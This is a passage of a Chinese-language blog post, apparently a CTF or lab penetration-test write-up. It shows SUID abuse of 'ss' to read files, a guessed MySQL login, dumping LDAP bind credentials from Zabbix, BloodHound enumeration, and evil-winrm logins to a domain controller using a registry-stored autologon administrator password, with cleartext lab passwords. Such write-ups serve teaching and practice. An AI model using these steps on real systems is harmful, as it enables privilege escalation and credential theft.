+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">72712</span> Feb  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2024</span> /usr/bin/chfn
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">35200</span> Mar <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2022</span> /usr/bin/fusermount3
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">128072</span> Mar <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2022</span> /usr/bin/ss
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">55680</span> Apr  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2024</span> /usr/bin/su
+</span></span><span style="display:flex;"><span>-rwsr-sr-x <span style="color:#ae81ff">1</span> daemon daemon <span style="color:#ae81ff">55624</span> Apr <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2022</span> /usr/bin/at
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">47488</span> Apr  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2024</span> /usr/bin/mount
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">44808</span> Feb  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2024</span> /usr/bin/chsh
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">40496</span> Feb  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2024</span> /usr/bin/newgrp
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">232416</span> Jun <span style="color:#ae81ff">25</span> 20:48 /usr/bin/sudo
+</span></span></code></pre></div><p>读一下flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ss -a -F /flag.txt
+</span></span></code></pre></div><h1 id="flag4">flag4<a hidden class="anchor" aria-hidden="true" href="#flag4">#</a></h1>
+<p>在后台的用户里的认证里，有DC的数据，上面有用户，但没有权限看配置文件，看一下服务器里的内容</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>zabbix@zabbix:/etc/zabbix$ ls -al
+</span></span><span style="display:flex;"><span>ls -al
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">76</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#ae81ff">5</span> root     root  <span style="color:#ae81ff">4096</span> Sep  <span style="color:#ae81ff">3</span> 13:47 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">112</span> root     root  <span style="color:#ae81ff">4096</span> Sep  <span style="color:#ae81ff">4</span> 10:32 ..
+</span></span><span style="display:flex;"><span>-rw-r--r--   <span style="color:#ae81ff">1</span> root     root  <span style="color:#ae81ff">1764</span> Aug <span style="color:#ae81ff">25</span> 18:15 apache.conf
+</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#ae81ff">2</span> www-data root  <span style="color:#ae81ff">4096</span> Sep  <span style="color:#ae81ff">3</span> 13:46 web
+</span></span><span style="display:flex;"><span>-rw-r--r--   <span style="color:#ae81ff">1</span> root     root <span style="color:#ae81ff">17323</span> Aug <span style="color:#ae81ff">25</span> 18:15 zabbix_agentd.conf
+</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#ae81ff">2</span> root     root  <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">25</span> 18:15 zabbix_agentd.d
+</span></span><span style="display:flex;"><span>-rw-------   <span style="color:#ae81ff">1</span> root     root <span style="color:#ae81ff">31264</span> Sep  <span style="color:#ae81ff">3</span> 13:47 zabbix_server.conf
+</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#ae81ff">2</span> root     root  <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">25</span> 18:15 zabbix_server.d
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ss -a -F /etc/zabbix/zabbix_server.conf
+</span></span><span style="display:flex;"><span>Error: an inet prefix is expected rather than <span style="color:#e6db74">&#34;LogFile=/var/log/zabbix/zabbix_server.log&#34;</span>.
+</span></span><span style="display:flex;"><span>Cannot parse dst/src address.
+</span></span></code></pre></div><p>这边猜测一些数据库</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mysql -uzabbix -ppassword
+</span></span></code></pre></div><p>这里进去看东西</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mysql&gt; <span style="color:#66d9ef">select</span> * from userdirectory_ldap<span style="color:#ae81ff">\G</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> * from userdirectory_ldap<span style="color:#ae81ff">\G</span>;
+</span></span><span style="display:flex;"><span>*************************** 1. row ***************************
+</span></span><span style="display:flex;"><span> userdirectoryid: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>            host: 172.16.22.41
+</span></span><span style="display:flex;"><span>            port: <span style="color:#ae81ff">389</span>
+</span></span><span style="display:flex;"><span>         base_dn: OU<span style="color:#f92672">=</span>Zabbix,DC<span style="color:#f92672">=</span>zwfw,DC<span style="color:#f92672">=</span>com
+</span></span><span style="display:flex;"><span>search_attribute: sAMAccountName
+</span></span><span style="display:flex;"><span>         bind_dn: CN<span style="color:#f92672">=</span>ldapadmin,OU<span style="color:#f92672">=</span>Zabbix,DC<span style="color:#f92672">=</span>zwfw,DC<span style="color:#f92672">=</span>com
+</span></span><span style="display:flex;"><span>   bind_password: XpVLGkQHm8
+</span></span><span style="display:flex;"><span>       start_tls: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>   search_filter: 
+</span></span><span style="display:flex;"><span>    group_basedn: 
+</span></span><span style="display:flex;"><span>      group_name: cn
+</span></span><span style="display:flex;"><span>    group_member: 
+</span></span><span style="display:flex;"><span>   user_ref_attr: 
+</span></span><span style="display:flex;"><span>    group_filter: 
+</span></span><span style="display:flex;"><span>group_membership: memberOf
+</span></span><span style="display:flex;"><span>   user_username: 
+</span></span><span style="display:flex;"><span>   user_lastname: 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> row in set <span style="color:#f92672">(</span>0.00 sec<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>给到了密码，bloodhound探测一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>proxychains4 bloodhound-python -u ldapadmin  -p <span style="color:#e6db74">&#39;XpVLGkQHm8&#39;</span>  -d  zwfw.com  -ns 172.16.22.41  -c all --auth-method ntlm --dns-tcp --zip
+</span></span></code></pre></div><p>能直接DC登录然后链接到administrator
+测试一下看是否能登录</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>proxychains4 nxc winrm 172.16.22.41 -u ldapadmin -p XpVLGkQHm8
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains4.conf
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.17
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> Dynamic chain  ...  192.168.71.1:6666  ...  172.16.22.41:5985  ...  OK
+</span></span><span style="display:flex;"><span>WINRM       172.16.22.41    <span style="color:#ae81ff">5985</span>   DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.0 Build <span style="color:#ae81ff">26100</span> <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:zwfw.com<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> Dynamic chain  ...  192.168.71.1:6666  ...  172.16.22.41:5985  ...  OK
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> Dynamic chain  ...  192.168.71.1:6666  ...  172.16.22.41:5985  ...  OK
+</span></span><span style="display:flex;"><span>WINRM       172.16.22.41    <span style="color:#ae81ff">5985</span>   DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> zwfw.com<span style="color:#ae81ff">\l</span>dapadmin:XpVLGkQHm8 <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>直接登录</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>proxychains4 evil-winrm -i 172.16.22.41 -u ldapadmin -p <span style="color:#e6db74">&#39;XpVLGkQHm8&#39;</span>
+</span></span></code></pre></div><p>这里经典流程探测一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>reg query <span style="color:#e6db74">&#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;</span>
+</span></span></code></pre></div><p>给到了密码</p>
+<pre tabindex="0"><code>
+Name    REG_SZ    administrator
+    AutoAdminLogon    REG_SZ    1
+    DefaultPassword    REG_SZ    a4Z6FcRYSp6LLSGO
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\ShellPrograms
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey
+</code></pre><p>直接登录</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>proxychains4 evil-winrm -i 172.16.22.41 -u administrator -p <span style="color:#e6db74">&#39;a4Z6FcRYSp6LLSGO&#39;</span>
+</span></span></code></pre></div><p>拿到flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; cat C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\f</span>*
+</span></span></code></pre></div><h1 id="后话">后话<a hidden class="anchor" aria-hidden="true" href="#后话">#</a></h1>
+<p>好久没水文章了，好多年没水了，传一篇，现场其实也打了，漏洞也找到了，手上当时没工具，确实有些难崩，其他就不细说了。文章好多截图都没放，疑似电脑开了hdr导致edge浏览器截图异常曝光，还有我懒。see you later.<img alt="wink" loading="lazy" src="../../images/%E6%B8%97%E9%80%8F/greatwall2025/wink.gif"></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/docker/">Docker</a></li>
+      <li><a href="http://localhost:1313/tags/springboot/">Springboot</a></li>
+      <li><a href="http://localhost:1313/tags/fastjson/">Fastjson</a></li>
+      <li><a href="http://localhost:1313/tags/%E6%8F%90%E6%9D%83/">提权</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">0raN9e&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
